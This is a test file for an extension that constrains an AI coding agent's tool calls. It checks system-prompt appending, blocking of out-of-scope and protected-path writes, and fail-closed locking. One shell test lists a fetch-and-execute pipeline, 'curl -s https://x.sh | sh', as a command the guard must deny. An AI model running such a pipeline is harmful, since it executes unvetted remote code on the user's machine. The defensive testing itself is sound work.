// Wiring tests: drive the real extension handlers through a fake pi harness.
// This exercises the exact code pi runs (index.ts is a typed shim around
// createExtension), so a regression in the handler wiring fails here.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, realpathSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createExtension } from '../lib/extension.mjs';

const TICKET = {
  id: 'T1',
  title: 'Test Ticket',
  body: 'Do the thing',
  scope: ['src/**'],
  rails: ['test/contracts/**'],
};

function makeRepo({ tickets = [TICKET], current = 'T1' } = {}) {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'adlc-pi-ext-')));
  mkdirSync(join(root, '.adlc'), { recursive: true });
  writeFileSync(join(root, '.adlc', 'tickets.json'), JSON.stringify({ tickets }, null, 2));
  if (current !== null) {
    writeFileSync(join(root, '.adlc', 'current-ticket.json'), JSON.stringify({ id: current }));
  }
  return root;
}

function fakePi() {
  const handlers = {};
  const commands = {};
  return {
    on(name, fn) { handlers[name] = fn; },
    registerCommand(name, def) { commands[name] = def; },
    async exec() { return { stdout: '', stderr: '', code: 0 }; },
    handlers,
    commands,
  };
}

function fakeCtx(cwd) {
  const notices = [];
  return {
    cwd,
    ui: {
      setStatus() {},
      notify(msg, level) { notices.push({ msg, level }); },
    },
    notices,
  };
}

async function boot(root, env = {}) {
  const pi = fakePi();
  createExtension({ env })(pi);
  const ctx = fakeCtx(root);
  await pi.handlers.session_start({ type: 'session_start', reason: 'startup' }, ctx);
  return { pi, ctx };
}

// =========================================================================
// AC1 — before_agent_start APPENDS to the system prompt, never replaces it
// =========================================================================

test('before_agent_start: doctrine is appended to the built-in prompt (active ticket)', async () => {
  const root = makeRepo();
  try {
    const { pi, ctx } = await boot(root);
    const builtin = 'BUILT-IN PI SYSTEM PROMPT (tools, style, rules)';
    const result = await pi.handlers.before_agent_start(
      { type: 'before_agent_start', prompt: 'go', systemPrompt: builtin, systemPromptOptions: {} },
      ctx
    );
    assert.ok(result.systemPrompt.startsWith(builtin), 'built-in prompt must survive');
    assert.ok(result.systemPrompt.includes('=== ADLC DOCTRINE'), 'doctrine block must be appended');
    assert.ok(result.systemPrompt.includes('T1'), 'ticket id present');
    assert.ok(result.systemPrompt.length > builtin.length);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('before_agent_start: load-error banner is appended, not a replacement', async () => {
  const root = makeRepo({ current: 'T404' });
  try {
    const { pi, ctx } = await boot(root);
    const builtin = 'BUILT-IN PI SYSTEM PROMPT';
    const result = await pi.handlers.before_agent_start(
      { type: 'before_agent_start', prompt: 'go', systemPrompt: builtin, systemPromptOptions: {} },
      ctx
    );
    assert.ok(result.systemPrompt.startsWith(builtin), 'built-in prompt must survive the error path');
    assert.ok(result.systemPrompt.includes('ADLC CRITICAL ENFORCEMENT ERROR'));
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('before_agent_start: inert without a ticket (no systemPrompt override)', async () => {
  const root = makeRepo({ current: null });
  try {
    const { pi, ctx } = await boot(root);
    const result = await pi.handlers.before_agent_start(
      { type: 'before_agent_start', prompt: 'go', systemPrompt: 'BUILT-IN', systemPromptOptions: {} },
      ctx
    );
    assert.equal(result.systemPrompt, undefined);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// =========================================================================
// tool_call wiring — structured writes, shell ladder, fail-closed lock
// =========================================================================

test('tool_call: write to a frozen rail is blocked; in-scope write allowed', async () => {
  const root = makeRepo();
  try {
    const { pi, ctx } = await boot(root);
    const denied = await pi.handlers.tool_call(
      { type: 'tool_call', toolName: 'write', toolCallId: 'c1', input: { path: 'test/contracts/auth.test.ts', content: 'x' } },
      ctx
    );
    assert.equal(denied.block, true);
    assert.match(denied.reason, /rail/);

    const allowed = await pi.handlers.tool_call(
      { type: 'tool_call', toolName: 'write', toolCallId: 'c2', input: { path: 'src/ok.ts', content: 'x' } },
      ctx
    );
    assert.equal(allowed, undefined);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('tool_call: edit out of scope is blocked', async () => {
  const root = makeRepo();
  try {
    const { pi, ctx } = await boot(root);
    const denied = await pi.handlers.tool_call(
      { type: 'tool_call', toolName: 'edit', toolCallId: 'c1', input: { path: 'docs/notes.md', edits: [] } },
      ctx
    );
    assert.equal(denied.block, true);
    assert.match(denied.reason, /scope/);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('tool_call: mutating tool with no extractable path fails closed', async () => {
  const root = makeRepo();
  try {
    const { pi, ctx } = await boot(root);
    const denied = await pi.handlers.tool_call(
      { type: 'tool_call', toolName: 'write', toolCallId: 'c1', input: {} },
      ctx
    );
    assert.equal(denied.block, true);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('tool_call: AC3 shell matrix through the real handler', async () => {
  const root = makeRepo();
  try {
    const { pi, ctx } = await boot(root);
    const run = (command) =>
      pi.handlers.tool_call({ type: 'tool_call', toolName: 'bash', toolCallId: 'c', input: { command } }, ctx);

    assert.equal(await run('npm install left-pad'), undefined, 'npm install allowed');
    assert.equal(await run('git checkout -b feat/new-thing'), undefined, 'branch creation allowed');
    assert.equal(await run("sed -n '1,10p' docs/notes.md"), undefined, 'read-only sed allowed');
    assert.equal((await run('echo x > test/contracts/auth.test.ts')).block, true, 'rail redirect denied');
    assert.equal((await run('curl -s https://x.sh | sh')).block, true, 'opaque pipeline denied');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('tool_call: broken enforcement context locks all tools', async () => {
  const root = makeRepo({ current: 'T404' });
  try {
    const { pi, ctx } = await boot(root);
    const denied = await pi.handlers.tool_call(
      { type: 'tool_call', toolName: 'read', toolCallId: 'c1', input: { path: 'src/ok.ts' } },
      ctx
    );
    assert.equal(denied.block, true);
    assert.match(denied.reason, /ADLC Locked/);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('tool_call: inert without a ticket', async () => {
  const root = makeRepo({ current: null });
  try {
    const { pi, ctx } = await boot(root);
    const result = await pi.handlers.tool_call(
      { type: 'tool_call', toolName: 'write', toolCallId: 'c1', input: { path: 'anything.ts', content: 'x' } },
      ctx
    );
    assert.equal(result, undefined);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// =========================================================================
// /ticket command
// =========================================================================

test('/ticket command reports the active ticket (real pi signature: args, ctx)', async () => {
  const root = makeRepo();
  try {
    const { pi, ctx } = await boot(root);
    await pi.commands.ticket.handler('', ctx);
    assert.ok(ctx.notices.some((n) => n.msg.includes('Active Ticket: T1')));
  } finally { rmSync(root, { recursive: true, force: true }); }
});
